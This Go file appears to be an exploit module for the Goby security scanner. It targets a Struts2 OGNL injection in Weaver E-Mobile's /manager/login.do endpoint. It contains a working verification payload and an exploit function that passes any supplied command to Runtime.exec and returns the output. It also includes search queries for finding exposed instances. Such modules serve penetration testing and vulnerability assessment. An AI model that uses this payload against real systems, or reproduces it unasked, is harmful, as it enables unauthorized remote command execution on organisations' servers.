package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
)

func init() {
	expJson := `{
    "Name": "Weaver-EMobile login.do Struts2 RCE",
    "Description": "'E-Mobile' is a platform which t by Shanghai Weaver Network Co., LTD.Users can read and deal with workflow、news、contacts and other kinds of information of OA by Weaver’s “E-Mobile” plarform on mobile.It can meet the needs of those who use Weaver’s OA System to deal with the information on Mobile Office",
    "Impact": "Weaver-EMobile login.do Struts2 RCE",
    "Recommendation": "<p>An official patch has been released to fix this vulnerability. Affected users can also take the following protective measures for temporary protection against this vulnerability.</p>",
    "Product": "Weaver",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "泛微E-Mobile login.do Struts2 命令执行漏洞",
            "Description": "'E-Mobile'是上海维沃网络有限公司开发的一个平台。用户可以通过维沃的“E-Mobile”平台在手机上阅读和处理OA的工作流、新闻、联系人等各类信息。 满足使用Weaver OA系统处理移动办公信息的需求。",
            "Impact": "<p>黑客可在服务器上执行任意命令，写入后门，从而入侵服务器，获取服务器的管理员权限，危害巨大。</p>",
            "Recommendation": "<p>1、严格过滤用户输入的数据，禁止执行系统命令。官方已发布补丁修复此漏洞。 受影响的用户还可以采取以下防护措施，针对该漏洞进行临时防护。<br></p>",
            "Product": "泛微E-Mobile",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Weaver-EMobile login.do Struts2 RCE",
            "Description": "'E-Mobile' is a platform which t by Shanghai Weaver Network Co., LTD.Users can read and deal with workflow、news、contacts and other kinds of information of OA by Weaver’s “E-Mobile” plarform on mobile.It can meet the needs of those who use Weaver’s OA System to deal with the information on Mobile Office",
            "Impact": "Weaver-EMobile login.do Struts2 RCE",
            "Recommendation": "<p>An official patch has been released to fix this vulnerability. Affected users can also take the following protective measures for temporary protection against this vulnerability.<br></p>",
            "Product": "Weaver",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(body=\"content=\\\"Weaver E-mobile\\\"\" || (body=\"E-Mobile&nbsp;\" && body=\"action=\\\"/verifyLogin.do\") || body=\"/images/login_logo@2x.png\" || (body=\"window.apiprifix = \\\"/emp\\\";\" && title=\"移动管理平台\"))",
    "GobyQuery": "(body=\"content=\\\"Weaver E-mobile\\\"\" || (body=\"E-Mobile&nbsp;\" && body=\"action=\\\"/verifyLogin.do\") || body=\"/images/login_logo@2x.png\" || (body=\"window.apiprifix = \\\"/emp\\\";\" && title=\"移动管理平台\"))",
    "Author": "李大壮",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2021-05-23",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "Weaver-EMobile"
        ],
        "Support": [],
        "Service": [],
        "System": [
            "Resin"
        ],
        "Hardware": []
    },
    "PocId": "10196"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/manager/login.do"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "message=%28%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23context%5b%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%5d%2eaddHeader%28%27X-RES%27%2c22345*32379%29%29"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.Header.Get("X-RES") == "723508755" {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := url.QueryEscape(ss.Params["cmd"].(string))
			data := "message=%28%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22" + cmd + "%22%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29"
			uri := "/manager/login.do"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = data
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}
